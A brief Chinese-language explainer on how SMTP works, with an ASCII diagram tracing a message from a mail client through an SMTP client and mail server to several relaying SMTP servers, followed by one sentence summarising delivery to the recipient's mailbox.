SMTP的实现

                                +--------------+
                                |  Mail Client |
                                +------+-------+
                                       |
                                       |
                                       v
                               +-------+-------+
                               | SMTP Client 1 |
                               +-------+-------+
                                       |
                                       |
                                       v
                                 +-----+-----+
                                 | Mail Server|
                                 +-----+-----+
                                       |
                                       |
                                       v
                               +-------+-------+
                               | SMTP Server 1 |
                               +-------+-------+
                                       |
                                       |
                  +--------------------+--------------------+
                  |                                         |
                  v                                         v
           +------+------+                          +-------+------+
           |         |                          |              |
           v         v                          v              v
     +-----+-----+ +-----+-----+        +-----+-----+  +-----+-----+
     | SMTP     | | SMTP     |        | SMTP     |  | SMTP     |
     | Server 2 | | Server 3 |        | Server 4 |  | Server 5 |
     +----------+ +----------+        +----------+  +----------+

SMTP过程是通过电子邮件客户端的SMTP客户端将邮件发送给邮件服务器的SMTP服务器，然后SMTP服务器将邮件传递给目标SMTP服务器，并由目标邮件服务器存储和管理邮件，最终送达到目标用户的邮件箱中
